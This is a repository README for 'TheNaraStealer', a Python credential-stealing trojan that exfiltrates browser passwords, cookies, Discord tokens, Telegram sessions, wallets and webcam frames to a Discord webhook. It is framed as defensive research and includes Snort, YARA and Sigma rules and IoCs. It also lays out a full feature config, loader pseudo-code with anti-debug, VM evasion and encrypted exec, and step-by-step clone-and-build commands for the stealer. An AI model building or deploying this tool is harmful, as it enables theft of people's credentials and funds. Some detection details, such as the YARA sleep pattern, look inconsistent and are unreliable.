# TheNaraStealer

[![Research Use Only](https://img.shields.io/badge/Purpose-Defensive%20Research-red)](#disclaimer)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Credential%20Access-orange)](https://attack.mitre.org/)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)

---

## 1. Executive Summary

**TheNaraStealer** is a modular, Python-based information-stealing trojan that leverages Discord webhooks as its primary command-and-control (C2) exfiltration channel. The framework incorporates anti-analysis features (VM detection, debugger evasion), persistence mechanisms (Startup registry, UAC bypass), and a builder pipeline that compiles the final portable executable (PE) via PyInstaller.

This repository is archived for **defensive cybersecurity research**—specifically to enable signature development, behavioral detection engineering, and adversary emulation in controlled laboratory environments.

---

## 2. Threat Classification (MITRE ATT&CK Mapping)

| Tactic | Technique ID | Technique Name | Implementation |
|--------|--------------|----------------|----------------|
| Execution | T1059.006 | Python Scripting | `exec(compile(...))` dynamic payload loading |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Defense Evasion | T1027 | Obfuscated Files or Info | AES-256-CBC encrypted payload + VMProtect UUID blacklist |
| Defense Evasion | T1548.002 | Bypass User Account Control | `cmstp.exe` / `fodhelper.exe` abuse (observed in builder logic) |
| Credential Access | T1555.003 | Credentials from Web Browsers | SQLite extraction from `Login Data`, `Web Data` |
| Credential Access | T1552.001 | Credentials in Files | Discord tokens, Telegram sessions, wallet files |
| Discovery | T1082 | System Information Discovery | `wmic`, `systeminfo`, hardware UUID retrieval |
| Collection | T1113 | Screen Capture | PIL-based screenshot of primary display |
| Collection | T1125 | Video Capture | Webcam frame capture via OpenCV/DirectShow |
| Exfiltration | T1567.002 | Exfiltration to Web Service | HTTPS POST to `discord.com/api/webhooks/*` |

---

## 3. Repository Architecture

```
TheNaraStealer/
├── build.py                 # Orchestrator: loads config, encrypts payload, invokes PyInstaller
├── config.json              # Runtime behavioral toggles & C2 endpoint
├── loader_template.py       # Stage-1 stub: anti-debug, VM checks, AES decryption, exec()
├── process.py               # Stage-2 payload: all collection logic & exfiltration
├── rar.exe                  # WinRAR console binary (creates password-protected archives)
├── rarreg.key               # WinRAR registration key (potential unauthorized licensing)
├── icon.png                 # PE icon resource
├── requirements.txt         # pyaes, urllib3, pyinstaller
└── run.bat                  # Build automation script
```

---

## 4. Configuration Deep Dive (`config.json`)

The builder reads this JSON to produce a tailored binary. Fields are parsed, encoded, and embedded within the loader as base64 strings.

```json
{
  "settings": {
    "c2": [0, "https://discord.com/api/webhooks/.../..."],
    "mutex": "HO2UOZeZODgTLUKE",
    "pingme": true,
    "vmprotect": false,
    "startup": false,
    "melt": false,
    "uacBypass": true,
    "archivePassword": "blank123",
    "consoleMode": 0,
    "debug": false,
    "pumpedStubSize": 0,
    "boundFileRunOnStartup": false
  },
  "modules": {
    "captureWebcam": true,
    "capturePasswords": true,
    "captureCookies": true,
    "captureHistory": true,
    "captureAutofills": true,
    "captureDiscordTokens": true,
    "captureGames": true,
    "captureWifiPasswords": true,
    "captureSystemInfo": true,
    "captureScreenshot": true,
    "captureTelegramSession": true,
    "captureCommonFiles": true,
    "captureWallets": true,
    "fakeError": [false, ["Error", "An unrecoverable error has occurred", 0]],
    "blockAvSites": true,
    "discordInjection": true
  }
}
```

### Critical Parameters

| Parameter | Type | Defensive Significance |
|-----------|------|------------------------|
| `c2` | List | Webhook URL; exfiltration endpoint. Monitor for `POST` to `/api/webhooks`. |
| `mutex` | String | Named kernel object to enforce singleton execution. IoC for process hollowing detection. |
| `vmprotect` | Boolean | Enables comparison against a hardcoded UUID list (VMware, VBox, sandboxes). |
| `uacBypass` | Boolean | Triggers elevated execution without user consent via known COM/UAC methods. |
| `archivePassword` | String | Password for the `.rar` archive containing all stolen data; static across samples. |
| `consoleMode` | Integer | `0` = `SW_HIDE`, `1` = visible console window. |

---

## 5. Technical Foundation & Execution Flow

### 5.1 Builder Pipeline (`build.py`)

1. **Config Encoding** – The entire `config.json` is serialized, compressed (zlib), and base64-encoded.
2. **Payload Encryption** – `process.py` is read, compressed, and encrypted using **AES-256-CBC** with a cryptographically random key and IV (generated via `os.urandom`).
3. **Stub Injection** – The loader template reads placeholders (`<encrypted_payload>`, `<key>`, `<iv>`, `<config>`) and writes the encrypted blobs directly into its source.
4. **PyInstaller Compilation** – The loader is compiled to a single PE executable with `--onefile --noconsole` flags, embedding `rar.exe` and `rarreg.key` as binary resources.

### 5.2 Loader (Stage-1) — Anti-Analysis Sequence

```python
# Pseudo-code from loader_template.py
if sys.gettrace() is not None:          # Debugger attached
    time.sleep(90)                      # Sleep to frustrate dynamic analysis

if os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys"):
    sys.exit(0)                         # VMware detection

# AES decryption of embedded payload
aes = pyaes.AESModeOfOperationCBC(key, iv)
decrypted = aes.decrypt(encrypted_blob)
exec(compile(decrypted, '<string>', 'exec'))
```

### 5.3 Payload (Stage-2) — Data Collection & Exfiltration

- **System Profiling**: Queries `win32_computersystem`, `win32_operatingsystem`, and `win32_processor` via WMI.
- **Browser Credential Harvesting**: 
  - Locates Chromium-based profiles (`%LOCALAPPDATA%\\*\\User Data\\Default`).
  - Decrypts cookies and passwords using DPAPI (`CryptUnprotectData`).
- **File Discovery**: Recursively scans common directories (`Desktop`, `Documents`, `Downloads`) for file extensions: `.txt`, `.docx`, `.pdf`, `.xlsx`, `.pptx`, `.wallet`, `.dat`, `.key`, `.json` (crypto wallets).
- **Archiving**: All collected files are packed into a password-protected RAR archive using the embedded `rar.exe` with the `-hp` switch (header encryption).
- **Exfiltration**: The archive and a system-info JSON are uploaded to the C2 via a `multipart/form-data` POST request.

---

## 6. Defensive Countermeasures & Detection Engineering

### 6.1 Network Detection (Snort/Suricata)

```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"TheNaraStealer Discord Webhook Exfiltration";
    content:"POST"; http_method;
    content:"/api/webhooks/"; http_uri;
    content:"discord.com"; http_host;
    pcre:"/\/api\/webhooks\/\d+\/[\w-]+/";
    flow:to_server,established;
    sid:1000001;
)
```

### 6.2 YARA Rule (Loader Stub)

```yara
rule TheNaraStealer_Loader {
    meta:
        description = "Detects the AES-256 loader stub for TheNaraStealer"
        author = "Defensive Research Archive"
        date = "2026-08-16"
    strings:
        $aes_iv = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }  // placeholder IV
        $pyaes = "pyaes"
        $vmmouse = "vmmouse.sys"
        $sleep90 = { 6A 5A E8 ?? ?? ?? ?? }   // sleep(90000)
    condition:
        uint16(0) == 0x5A4D and filesize < 5MB and
        any of ($aes_iv, $pyaes) and ($vmmouse or $sleep90)
}
```

### 6.3 Sigma Rule (Windows Event Logs)

```yaml
title: TheNaraStealer Persistence Installation
id: 7a8f3e5c-4b2d-4a1e-9f0c-7d8e9f0a1b2c
status: experimental
description: Detects creation of startup Run key used by TheNaraStealer
logsource:
    product: windows
    service: security
detection:
    registry:
        EventID: 4657
        ObjectName|contains: '\Software\Microsoft\Windows\CurrentVersion\Run'
        ProcessName|endswith: '\python.exe'
    condition: registry
```

### 6.4 Mitigation Strategies

| Domain | Measure |
|--------|---------|
| **Application Control** | Block execution of unsigned PyInstaller-generated binaries via AppLocker/WDAC. |
| **Browser Hardening** | Disable saving of passwords; enforce MFA to nullify stolen session cookies. |
| **Network Segmentation** | Egress filtering to block `discord.com` for non-business endpoints. |
| **Endpoint Detection** | Monitor for `rar.exe` spawning unexpectedly and writing to temp directories. |
| **Credential Hygiene** | Rotate tokens and enforce Conditional Access policies that re-validate device posture. |

---

## 7. Indicators of Compromise (IoCs)

### File Hashes (Sample-dependent — indicative only)
| Artifact | Example Value |
|----------|---------------|
| Mutex Name | `HO2UOZeZODgTLUKE` |
| Archive Password | `blank123` |
| C2 Pattern | `https://discord.com/api/webhooks/{id}/{token}` |

### Registry Artifacts
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NaraUpdate
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NaraUpdate
```

### File Paths Touched
```
%TEMP%\*.rar
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data
%APPDATA%\Discord\Local Storage\leveldb
%APPDATA%\Telegram Desktop\tdata
```

### Network IoCs
- HTTP POST requests to `discord.com` with `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- Multipart/form-data payloads containing `archive.rar` and `sysinfo.json`

---

## 8. Build Instructions (Research-Isolated Environment Only)

> **Mandatory Precondition:** Execute only on an air-gapped, non-networked virtual machine that is discarded after the analysis session. Authorization from the system owner is required.

```bash
# Clone repository
git clone https://github.com/Naratorul/TheNaraStealer.git
cd TheNaraStealer

# Create isolated Python virtual environment
python -m venv .venv
.venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# (Optional) Modify config.json to point to a controlled webhook endpoint for testing

# Build the executable
python build.py

# The output PE will be located in the current directory with a timestamped name.
```

---

## 9. Research Data & Ethics Statement

This documentation is compiled under the **Defensive Cybersecurity Research Archive** protocol. The source code and analysis are intended solely for:

- Academic study of malware tradecraft.
- Development of host-based and network-based detection signatures.
- Training for security operations center (SOC) teams in adversary simulation.
- Vulnerability research on operating system security features.

**Prohibited Uses** (non-exhaustive):
- Deployment against any system without explicit written consent.
- Use in any malicious, fraudulent, or unauthorized activity.
- Redistribution in a manner that facilitates criminal enterprise.

---

## 10. References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Security Intelligence — Credential Stealers](https://www.microsoft.com/security/blog/)
- [Discord Webhook API Documentation](https://discord.com/developers/docs/resources/webhook)
- [Python PyInstaller Documentation](https://pyinstaller.org/)
- [AES-256-CBC Specification (NIST FIPS 197)](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf)

---

*Archive Version: 1.0.0(After-Beta)*
